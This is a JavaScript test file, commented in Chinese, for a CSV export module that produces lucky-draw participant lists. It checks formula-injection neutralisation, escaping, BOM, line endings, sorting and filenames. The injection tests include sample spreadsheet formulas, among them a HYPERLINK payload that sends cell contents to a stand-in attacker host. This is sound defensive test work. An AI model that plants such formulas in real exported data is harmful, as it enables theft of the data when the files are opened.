/**
 * T52 CSV 匯出（js/engine/csv.js）
 * ------------------------------------------------------------------
 * 規格：docs/06 §7.3
 *
 * CSV 的每一種錯法都有同一個特徵：**檔案打得開、看起來正常、內容是錯的**。
 * 少一個 BOM 是亂碼、少逸出一個逗號是整列往左移一格、少擋一個等號是
 * 主辦的 Excel 幫玩家執行了一段公式。
 *
 * ⭐ 公式注入這一條特別重要：暱稱是玩家自己取的，而且 `players` 的暱稱
 *    連未登入的人都改得動（docs/06 §5.1 的取捨）。主辦一定會用 Excel
 *    打開這份抽獎名單。
 */

import {
  sanitizeCell, toCsv, luckyDrawRows, luckyDrawSummary, csvFilename, LUCKY_DRAW_COLUMNS
} from '../../js/engine/csv.js';

const BOM = String.fromCharCode(0xFEFF);

describe('T52-1 ⭐ 公式注入', () => {
  test.each(['=1+1', '+A1', '-2+3', '@SUM(A1:A9)'])('%s 開頭要被中和掉', s => {
    // Excel／Google 試算表看到這些開頭會**執行**它。前面加一個單引號
    // 就變成純文字——那是業界的標準做法
    expect(sanitizeCell(s)).toBe(`'${s}`);
  });

  test('⭐ Tab 與 CR 開頭也要擋（可以夾帶在公式前面繞過只看 = + - @ 的檢查）', () => {
    expect(sanitizeCell('\t=1+1')).toBe("'\t=1+1");
    // ⚠️ 含 CR 的那一格還會被整格包起來，所以單引號在**引號裡面**。
    //    斷言整格的第一個字元會失敗——要看試算表真正讀到的內容。
    expect(sanitizeCell('\r=1+1')).toBe('"\'\r=1+1"');
  });

  test('⭐ 真的很像攻擊的那一種：把儲存格變成超連結去外部網址', () => {
    const evil = '=HYPERLINK("http://evil.example/?d="&A1,"點我")';
    const out = sanitizeCell(evil);
    // 這一格同時含逗號與雙引號，所以會被整格包起來——
    // 單引號在引號**裡面**，試算表讀到的第一個字元就是它
    expect(out.startsWith(String.fromCharCode(34) + "'")).toBe(true);
    expect(out).toContain('""');
  });

  test('一般的暱稱不要被動到', () => {
    expect(sanitizeCell('阿哲')).toBe('阿哲');
    expect(sanitizeCell('Kevin')).toBe('Kevin');
    expect(sanitizeCell('1+1')).toBe('1+1');       // 不是開頭就不危險
  });
});

describe('T52-2 逸出', () => {
  test('含逗號要整格包起來（不然那一列後面全部往左移一格）', () => {
    expect(sanitizeCell('王小明,備註')).toBe('"王小明,備註"');
  });

  test('含雙引號要包起來，而且雙引號要變成兩個（RFC 4180）', () => {
    expect(sanitizeCell('含"引號"')).toBe('"含""引號"""');
  });

  test('含換行要包起來（不然一列變兩列）', () => {
    expect(sanitizeCell('第一行\n第二行')).toBe('"第一行\n第二行"');
    expect(sanitizeCell('第一行\r\n第二行')).toBe('"第一行\r\n第二行"');
  });

  test('null / undefined 是空字串，不是 "null"', () => {
    // 印成 "null" 的話主辦會以為那個人的暱稱真的叫 null
    expect(sanitizeCell(null)).toBe('');
    expect(sanitizeCell(undefined)).toBe('');
  });

  test('數字 0 要印出來，不可以變成空的', () => {
    expect(sanitizeCell(0)).toBe('0');
  });
});

describe('T52-3 整份檔案', () => {
  const COLS = [{ key: 'a', label: '代號' }, { key: 'b', label: '暱稱' }];

  test('⭐ 一定要有 UTF-8 BOM（少了它 Excel 在中文 Windows 上是亂碼）', () => {
    expect(toCsv(COLS, [{ a: 'FEDA-0001', b: '阿哲' }]).charCodeAt(0)).toBe(0xFEFF);
  });

  test('⭐ 行尾是 CRLF（RFC 4180；舊版 Excel 對純 LF 會讀成一整列）', () => {
    const out = toCsv(COLS, [{ a: '1', b: '2' }], { bom: false });
    expect(out).toBe('代號,暱稱\r\n1,2\r\n');
  });

  test('欄序就是欄位定義的順序', () => {
    const out = toCsv(COLS, [{ b: '阿哲', a: 'FEDA-0001' }], { bom: false });
    expect(out.split('\r\n')[1]).toBe('FEDA-0001,阿哲');
  });

  test('少了某一欄就留空，不要整份壞掉', () => {
    const out = toCsv(COLS, [{ a: 'FEDA-0001' }], { bom: false });
    expect(out.split('\r\n')[1]).toBe('FEDA-0001,');
  });

  test('沒有資料也要有表頭（空檔案打開會讓人以為壞了）', () => {
    expect(toCsv(COLS, [], { bom: false })).toBe('代號,暱稱\r\n');
  });

  test('沒有欄位定義要丟錯', () => {
    expect(() => toCsv([], [])).toThrow();
    expect(() => toCsv(null, [])).toThrow();
  });

  test('表頭本身也要逸出（欄位名有逗號時）', () => {
    const out = toCsv([{ key: 'a', label: '代號,備註' }], [], { bom: false });
    expect(out).toBe('"代號,備註"\r\n');
  });
});

describe('T52-4 抽獎名單', () => {
  const P = (over = {}) => ({
    playerId: 'FEDA-0001', nickname: '阿哲', luckyDrawEntries: 2,
    completedChallengeIds: ['g01', 'g02'], contact: { phone: null, lineUserId: null },
    ageBand: 'adult', createdVia: 'self', ...over
  });

  test('⭐ 0 張的人不進名單（漏篩就等於把沒資格的人放進抽獎箱）', () => {
    const rows = luckyDrawRows([
      P(), P({ playerId: 'FEDA-0002', luckyDrawEntries: 0, completedChallengeIds: [] })
    ]);
    expect(rows.map(r => r.playerId)).toEqual(['FEDA-0001']);
  });

  test('⭐ 張數用 player.luckyDrawEntries，不在這裡重算', () => {
    // 重算要讀 config/challengeRewards 與關卡總數，跟管線分岔的話
    // 「名單上的張數」跟「玩家手機上看到的」會不一樣
    const rows = luckyDrawRows([P({ luckyDrawEntries: 7, completedChallengeIds: ['g01'] })]);
    expect(rows[0].entries).toBe(7);
    expect(rows[0].completedCount).toBe(1);
  });

  test('⭐ 排序是張數多的在前，同張數依代號——重匯一次要拿到同一份', () => {
    const rows = luckyDrawRows([
      P({ playerId: 'FEDA-0009', luckyDrawEntries: 1 }),
      P({ playerId: 'FEDA-0002', luckyDrawEntries: 5 }),
      P({ playerId: 'FEDA-0001', luckyDrawEntries: 1 })
    ]);
    expect(rows.map(r => r.playerId)).toEqual(['FEDA-0002', 'FEDA-0001', 'FEDA-0009']);
  });

  test('壞掉的欄位不要讓整份匯出失敗', () => {
    const rows = luckyDrawRows([
      { playerId: 'FEDA-0003', luckyDrawEntries: 1 },              // 沒有暱稱、沒有陣列
      { playerId: 'FEDA-0004', luckyDrawEntries: '3' }             // 字串張數 → 當成 0，被濾掉
    ]);
    expect(rows).toHaveLength(1);
    expect(rows[0]).toMatchObject({ playerId: 'FEDA-0003', nickname: '', completedCount: 0 });
  });

  test('聯絡方式：兩個都沒有就留空，有就串起來', () => {
    expect(luckyDrawRows([P()])[0].contact).toBe('');
    expect(luckyDrawRows([P({ contact: { phone: '0912', lineUserId: 'U1' } })])[0].contact)
      .toBe('0912 / U1');
  });

  test('年齡層與建立方式翻成人話；沒填就留空', () => {
    expect(luckyDrawRows([P({ ageBand: 'kid', createdVia: 'staff' })])[0])
      .toMatchObject({ ageBand: '兒童', createdVia: '現場代建' });
    expect(luckyDrawRows([P({ ageBand: null })])[0].ageBand).toBe('');
  });

  test('⭐ 接上 toCsv：暱稱裡的公式在最終檔案裡也被中和', () => {
    const csv = toCsv(LUCKY_DRAW_COLUMNS, luckyDrawRows([P({ nickname: '=1+1' })]), { bom: false });
    expect(csv.split('\r\n')[1]).toContain("'=1+1");
  });
});

describe('T52-5 摘要', () => {
  const R = (entries, completed) => ({ entries, completedCount: completed });

  test('人數與張數', () => {
    expect(luckyDrawSummary([R(3, 3), R(1, 1)])).toMatchObject({ players: 2, entries: 4 });
  });

  test('⭐ 全破人數依「關卡總數」算，不可以寫死 5（驗收 C08：新增第六關不改程式）', () => {
    const rows = [R(7, 5), R(9, 6), R(1, 1)];
    expect(luckyDrawSummary(rows, 5).allDone).toBe(2);      // 5 關時：完成 5 與 6 的都算
    expect(luckyDrawSummary(rows, 6).allDone).toBe(1);      // 6 關時：只有完成 6 的算
  });

  test('不知道關卡總數時回 null，不要猜一個數字', () => {
    expect(luckyDrawSummary([R(1, 1)]).allDone).toBeNull();
    expect(luckyDrawSummary([R(1, 1)], 0).allDone).toBeNull();
  });

  test('空名單', () => {
    expect(luckyDrawSummary([], 5)).toEqual({ players: 0, entries: 0, allDone: 0 });
  });
});

describe('T52-6 檔名', () => {
  test('帶日期', () => {
    expect(csvFilename('抽獎名單', '2026-10-11T09:00:00+08:00')).toBe('抽獎名單-2026-10-11.csv');
  });

  test('日期不成格式時不要生出一個看起來正常的爛檔名', () => {
    expect(csvFilename('抽獎名單', null)).toBe('抽獎名單-unknown.csv');
    expect(csvFilename('抽獎名單', 'abc')).toBe('抽獎名單-unknown.csv');
  });
});
